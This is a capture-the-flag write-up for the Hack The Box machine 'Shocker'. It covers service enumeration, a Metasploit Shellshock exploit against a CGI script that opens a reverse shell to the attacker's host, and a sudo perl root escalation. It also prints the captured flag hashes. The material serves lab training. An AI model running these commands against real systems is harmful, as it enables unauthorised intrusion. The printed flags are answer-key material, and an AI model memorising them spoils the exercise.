# HTB: Shocker

## Engagement Overview

**Target:** Shocker     
**Box IP:** 10.10.10.56     
**Date:** 2025-07-08    
**Difficulty:** Easy

---

### Objectives

- Enumerate HTTP and SSH services  
- Identify and exploit the Shellshock vulnerability  
- Escalate privileges to root  
- Capture user and root flags  

---

## Service Enumeration

```bash
nmap -sV -sC -p- 10.10.10.56
```

- **Port 80/tcp** – Apache 2.4.18 (Ubuntu)  
- **Port 2222/tcp** – OpenSSH 7.2p2 Ubuntu

### Dirsearch Results

```bash
dirsearch -u http://10.10.10.56 -e cgi,sh,pl,py
```

- `/cgi-bin/user.sh` (confirmed for Shellshock)
- Other 403 responses for `.htaccess*`, `/server-status`, etc.

---

## Methodologies

### Initial Access - Shellshock (CVE-2014-6271)

**Vulnerability Explanation:**  
Apache mod_cgi allows remote code execution via crafted HTTP headers. Exploitable through the `user.sh` script in `/cgi-bin/`.

**Exploitation Method (Metasploit):**
```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 10.10.10.56
set TARGETURI /cgi-bin/user.sh
set LHOST <your-ip>
run
```

**Post-Exploitation:**  
- Shell received via Meterpreter  
- User: `shelly`

---

## Privilege Escalation

**sudo -l output:**  
```bash
User shelly may run the following commands on Shocker:
(root) NOPASSWD: /usr/bin/perl
```

**Exploitation:**
```bash
sudo perl -e 'exec "/bin/sh";'
```

- Shell escalated to root  
- `whoami` → `root`  
- `root.txt` captured

---

## House Cleaning
- Verified user and root flags
- Session closed cleanly
- No modifications left on disk

---

## Post-Exploitation

**Tools Utilized**
* `nmap`  
* `dirsearch`  
* `metasploit`  
* `LinEnum`  
* `gtofbins`  

**User Flag:**  
`084f092f15d55672beb680d9d4c00bca`  

**Root Flag:**  
`5b644f916a82afcad38cd359ec742ccc`  

---

## Key Takeaways

* **Tool Familiarity:** Improved comfort with `msfconsole`; it aligns well with your mental model.
* **Shell Handling:** Gained insight into managing reverse shells and privilege escalation using simple scripted payloads.
* **Practical Scripting Idea:** Consider writing a custom parser for `linenum.sh` output to streamline future small-box enumeration.
* **Flow Clarity:** HTB easy boxes like this are best used for muscle memory on tooling and developing clean workflows.